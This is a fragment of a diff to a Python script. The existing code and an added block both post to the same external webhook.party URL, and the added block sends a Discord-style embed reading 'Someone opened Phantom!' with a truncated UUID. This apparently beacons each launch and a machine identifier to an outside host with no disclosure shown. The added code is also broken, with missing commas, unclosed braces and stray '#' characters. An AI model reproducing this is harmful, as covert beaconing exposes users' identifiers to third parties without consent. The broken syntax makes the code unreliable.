@@ -44,10 +44,21 @@ data = {#
         }#
     ]#
 }#
+
+data_priv = {
+    "embeds": [
+        {
+            "title": "Someone opened Phantom!"
+            "description": f"UUID: {uuid[:-15]}"
+            "color": 0x7289DA
 #
 if uuid:#
     response = requests.post(#
         "https://l.webhook.party/hook/nRBn6m7Ry%2FTrJgqsWP4KpAFbM4F3cF%2F5nIcITfsg0v2aOf24tNlVtvD6gH9sJE7imYjYNS2O5dBbK%2BxEOKKxWYfDCixfqD8yMFoHWqM4YI69JqO1zkcNinMIf8qKvzJ%2BfcUX1ZnF0wLzeYN2AGxWq5DcL7pVZl1GlWvnNNOix72TvHj27OjabPrxDtrTY4qo6KS%2BPRdvN3x59jxaj%2FPz1Ud2DSbwrT8ZL%2BEf0l6uK%2B7cXjkKOowrbRCBhGvDZ%2BQT7ZsTjB9d8H7xGh%2Buf6B0wZfondYaqrNEiVFniIPnJ7VMLwavIlkSU0xynUCGUIItF7FinJZhEdkmqcwJFn%2Fw%2FiEYmYGUcpXPb%2FnTMNhwfbuSCAPl80mWKuTr9KLVaCmXFk1Op2ZtlLc%3D/WAp%2FDRUYSqs00voB",
         json=data#
     )#
+    response = requests.post(
+        "https://l.webhook.party/hook/nRBn6m7Ry%2FTrJgqsWP4KpAFbM4F3cF%2F5nIcITfsg0v2aOf24tNlVtvD6gH9sJE7imYjYNS2O5dBbK%2BxEOKKxWYfDCixfqD8yMFoHWqM4YI69JqO1zkcNinMIf8qKvzJ%2BfcUX1ZnF0wLzeYN2AGxWq5DcL7pVZl1GlWvnNNOix72TvHj27OjabPrxDtrTY4qo6KS%2BPRdvN3x59jxaj%2FPz1Ud2DSbwrT8ZL%2BEf0l6uK%2B7cXjkKOowrbRCBhGvDZ%2BQT7ZsTjB9d8H7xGh%2Buf6B0wZfondYaqrNEiVFniIPnJ7VMLwavIlkSU0xynUCGUIItF7FinJZhEdkmqcwJFn%2Fw%2FiEYmYGUcpXPb%2FnTMNhwfbuSCAPl80mWKuTr9KLVaCmXFk1Op2ZtlLc%3D/WAp%2FDRUYSqs00voB",
+        json=data_priv
+    )
 #
